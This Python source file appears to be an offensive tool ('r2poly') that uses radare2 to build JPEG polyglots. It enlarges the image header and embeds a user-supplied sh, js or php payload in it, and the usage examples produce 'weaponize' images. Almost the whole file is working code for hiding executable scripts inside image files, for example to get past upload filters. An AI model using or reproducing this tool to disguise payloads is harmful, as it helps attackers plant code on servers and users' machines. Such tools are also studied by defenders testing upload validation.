#!/usr/bin/env python3
import r2pipe
import sys
import os
import tempfile

def file_exists(file):
	if os.path.exists(file):
		return True
	else:
		print("File "+file+" does not exist")
		exit(0)

def file_size(file):
	s=os.path.getsize(file)
	return s

def file_type(file):
	jpg_signatures=["FFD8FFE0","FFD8FFE1","FFD8FFE2","FFD8FFE8"]
	r2=r2pipe.open(file)
	file_signature=r2.cmd('p8 4').upper()
	if file_signature.rstrip() in jpg_signatures:
		return "jpg"
	else:
		return "unknown"

def select_new_header_size(payload_size):
	"""
    only some values are valid because we need to include the hash char (commentary) -> 0x23h
	"""
	valid_sizes=[0x123,0x223,0x323,0x423,0x523,0x623,0x723,0x823,0x923,0xA23,0xB23,0xC23,0xF23,0xE23,0xF23] 
	for size in valid_sizes:		
		if payload_size<size:
			return size
		else:
			continue
		return 0

def resize_jpg_header(file,payload_size):
	r2=r2pipe.open(file,["-w"])
	header_size_orig_hex=r2.cmd('p8 2 @0x4')				#get 4 bytes at offset 0x04 [0x04: jpg header size]
	header_size_orig_hex_int=int(header_size_orig_hex,16)
	offset=hex(4+header_size_orig_hex_int)					# offset to insert bytes, just where sections finishes)	
	new_size=select_new_header_size(payload_size)				# select the appropiate size to insert (only somes are valid)
	if new_size==0:
		print("Payload size too big. Not supported.")
		exit(0)
	else:
		bytes_to_insert=new_size-header_size_orig_hex_int
		patch_bytes=hex(new_size).replace('x','')
		"""
		PATCHING HEADER
		"""
		r2.cmd('wx '+patch_bytes+' @0x4')				# patch new header size bytes
		r2.cmd('weN '+offset+' '+str(bytes_to_insert))			# insert bytes to allocate script
		return offset

def payload_to_string(payload_type,payload):
	fi=open(payload,"r")
	file_content=fi.read()
	if payload_type=="sh":
		str=";".join(file_content.split('\n')).replace('"','\'')# replace '\n' with ; and " with '
		str=str.replace(';;',';')
		str=str+"exit"	
	else:
		if payload_type=="js" or payload_type=="php":
			str=" ".join(file_content.split('\n')).replace('"','\'')# replace '\n' with ; and " with '
			str='"'+str+'"'
		else:
			print("payload type "+payload_type+" is not supported")		# add exit at the end
	return str

def insert_payload_in_jpg_header(tmp_file,offset,payload_type,payload):
	r2=r2pipe.open(tmp_file,["-w"])
	patch_bytes='0A0A'
	r2.cmd('wx '+patch_bytes+' @'+str(offset))				# write 0A0A to create a newline
	offset=hex(int(offset,16)+2)						# increase offset 2 bytes
	payload_string=payload_to_string(payload_type,payload)			# convert script to oneliner
	r2.cmd('w '+payload_string+' @'+str(offset))				# write payload
	r2.cmd('wx '+"20"+' @'+str(offset))							# rm "
	offset=hex(int(offset,16)+len(payload_string))				# write 0A0A to create a newline
	offset_1=hex(int(offset,16)-1)
	r2.cmd('wx '+"20"+' @'+str(offset_1))						# rm "
	r2.cmd('wx '+patch_bytes+' @'+str(offset))					# write 0A0A to create a newline
	print('Polyglot done!\n')
	return 0

def create_polyglot_file(input_file,payload_type,payload,output_file):
	if file_exists(input_file) and file_exists(payload):			# verify files existence
		ft=file_type(input_file)					# get input file fyletype
		if ft=="jpg":							# only jpg supported for now 
			payload_size=file_size(payload)				# get payload bytes size
			fi=open(input_file,"rb")				# open input file
			data=fi.read()						# read input file
			fi.close()						# close input file
			ft=tempfile.NamedTemporaryFile(delete=False)		# creating temporary file
			tmp_file=ft.name
			ft.write(data)						# copying data from input file to temp file
			offset=resize_jpg_header(tmp_file,payload_size)		# resize jpg header and get offset
			insert_payload_in_jpg_header(tmp_file,offset,payload_type,payload)	# insert paylaod
			fo=open(output_file,"wb")						# open output file
			ft.seek(0)								# seek temp file to byte 0 
			data=ft.read()								# read temp file content
			fo.write(data)								# write temp file to output file
			fo.close()
			ft.close()
			os.unlink(ft.name)
		else:
			print("filetype "+ft+" is not supported")
	return 0

def usage(file_name):
	print("")
	print("usage: $"+file_name+" <input_file> <payload_type (sh|js|php|PS)> <payload> <output_file>")
	print("        "+file_name+" creates a polyglot file by inserting\n        a payload (sh, js, php, powershell, etc) inside\n        the input_file and saves it in output_file.")
	print("")
	print("examples:")
	print("   $ "+file_name+" dog.jpg sh my_sh_payload dog_weaponize.jpg")
	print("   $ "+file_name+" cat.jpg js my_js_payload cat_weaponize.jpg")

def name():
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	print("")	
	print(OKGREEN+"           ad888888b,  "+OKBLUE+"            "+FAIL+"           "+HEADER+"88"+ENDC+"")
	print(OKGREEN+"          d8\"     \"88"+OKBLUE+"            "+FAIL+"           "+HEADER+"  88"+ENDC+"")
	print(OKGREEN+"                  a8P  "+OKBLUE+"            "+FAIL+"           "+HEADER+"88"+ENDC+"")
	print(OKGREEN+"8b,dPPYba,     ,d8P\"  "+OKBLUE+"8b,dPPYba,  "+FAIL+" ,adPPYba, "+HEADER+" 88"+ENDC+" 8b       d8")
	print(OKGREEN+"88P'   \"Y8   a8P\"    "+OKBLUE+" 88P'    \"8"+FAIL+"a a8\"     8a"+HEADER+"\" 88"+ENDC+" `8b     d8\'")
	print(OKGREEN+"88         a8P\'       "+OKBLUE+"88       d8 "+FAIL+"8b       d8"+HEADER+" 88"+ENDC+"  `8b   d8\'")
	print(OKGREEN+"88        d8\"         "+OKBLUE+"88b,   ,a8\""+FAIL+" \"8a,   ,a8"+HEADER+"\" 88"+ENDC+"   `8b,d8\'")
	print(OKGREEN+"88        88888888888 "+OKBLUE+"88`YbbdP\"'  "+FAIL+" `\"YbbdP\"\'"+HEADER+"  88"+ENDC+"     Y88\'")
	print(OKGREEN+"                      "+OKBLUE+"88           "+FAIL+"             "+HEADER+"     "+ENDC+"d8\'")
	print(OKGREEN+"                      "+OKBLUE+"88           "+FAIL+"             "+HEADER+"    "+ENDC+"d8\'")
	print("")

def menu(script_file_name):
	name()					# program banner r2poly
	usage(script_file_name)	# usage 

def main(parameters):
	if len(parameters)<5:
		menu(parameters[0])
		exit(0)
	# parameters
	input_file=parameters[1]
	payload_type=parameters[2]
	payload=parameters[3]
	output_file=parameters[4]
	#
	create_polyglot_file(input_file,payload_type,payload,output_file)

main(sys.argv)
